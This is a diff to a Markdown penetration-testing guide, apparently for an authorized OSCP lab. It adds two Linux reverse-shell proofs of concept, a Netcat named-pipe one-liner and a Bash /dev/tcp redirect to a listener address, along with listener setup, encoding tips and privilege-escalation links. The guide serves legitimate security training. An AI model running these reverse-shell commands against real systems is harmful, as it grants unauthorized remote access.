@@ -111,13 +111,33 @@ rlwrap nc -lvnp "$LPORT"
 nc -lvnp "$LPORT"
 ```
 
-**Linux lab reverse-shell example** — use only when you have already confirmed arbitrary command execution and know Bash is present:
+### Two Linux RCE-to-shell PoCs — Bash and Netcat FIFO
+
+These are **post-confirmation access examples for an authorized OSCP lab only**, not initial vulnerability-detection payloads. First prove command execution with `whoami` or `id` as above. On **Kali**, identify the correct VPN IP with `ip -br addr` and start the listener before submitting either command:
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/192.168.45.10/4444 0>&1'
+nc -lvnp 4444
 ```
 
-Replace the IP and port with the **actual reachable Kali listener**. This syntax depends on Bash's `/dev/tcp` support and a shell capable of interpreting the redirection. If placing the command in an HTTP parameter, encode it correctly using Burp or `curl --data-urlencode`; don't assume raw spaces and ampersands will survive URL parsing.
+**PoC A — Netcat with a named pipe (FIFO):**
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.219 4444 >/tmp/f
+```
+
+This is the supplied lab example. **Important:** `rm /tmp/f` removes anything already stored at that path. Do **not** run it unless you have checked that `/tmp/f` belongs to your authorized disposable lab session; use a uniquely named FIFO instead if there is any doubt. This method requires `mkfifo`, a working `nc` binary and a reachable outbound TCP connection. It creates a FIFO in `/tmp`; clean up only your own FIFO when finished.
+
+**PoC B — Bash TCP reverse shell:**
+
+```bash
+bash -c "bash -i >& /dev/tcp/192.168.45.219/4444 0>&1"
+```
+
+This requires **Bash** with `/dev/tcp` support. Netcat is not required on the target for PoC B.
+
+**Before testing:** replace `192.168.45.219` with your **actual Kali VPN address reachable from the target** and `4444` with the listener port; the addresses here are examples. Submit **only one payload at a time** through a **confirmed command-injection/RCE point**. When sent in a web parameter, quotes, spaces, `&` and redirection characters may need proper encoding; a working standalone shell command does not automatically work in an HTTP parameter.
+
+**RCE versus reverse shell:** a demonstrated output marker proves command execution; receiving a shell only demonstrates a foothold at the **service account's** current privileges. If a callback fails, check Bash/Netcat availability, listeners, VPN routing, egress filtering, process lifetime, quoting and encoding before retrying.
 
 **What success looks like:** the listener receives a connection, and `whoami`/`id` identify the expected low-privileged service account. A connection that immediately closes may indicate an incompatible shell, missing binary or application timeout.
 
@@ -200,7 +220,9 @@ cd
 
 Record the account, host, working directory, OS, shell type and the exact vulnerability used. Avoid altering persistence settings or collecting unrelated user data.
 
-Then proceed to the appropriate guide: **Linux Privilege Escalation** or **Windows Privilege Escalation** (planned next).
+**Next action after an RCE foothold:** identify the current user, groups and operating system, then use [Linux Privilege Escalation](../04-Privilege-Escalation/linux-privesc.md) or [Windows Privilege Escalation](../04-Privilege-Escalation/windows-privesc.md). A reverse shell does **not** automatically grant root/SYSTEM.
+
+**Privilege escalation and pivoting are different steps:** privilege escalation gains stronger rights on the **current host**; [Pivoting and Tunneling](../07-Pivoting/pivoting-tunneling.md) uses an authorized host to reach a **different in-scope network or service**. Pivoting is necessary **only if the next lab objective requires it**, and it does not inherently require root or SYSTEM. Check your foothold, scope, network routes and allowed access first.
 
 ## 9. Troubleshooting decision table
 
@@ -226,6 +248,8 @@ Then proceed to the appropriate guide: **Linux Privilege Escalation** or **Windo
 - [ ] Check quoting, encoding and network paths when a payload fails.
 - [ ] Verify the shell account and hostname.
 - [ ] Stabilize only if useful and supported.
+- [ ] After confirmed RCE, choose one authorized Bash or FIFO/Netcat shell PoC, verify the callback and avoid overwriting another file at `/tmp/f`.
+- [ ] Distinguish local privilege escalation from pivoting; use only the next step justified by the lab scope.
 - [ ] Save sanitized evidence and note the next privilege-escalation path.
 
 ## References
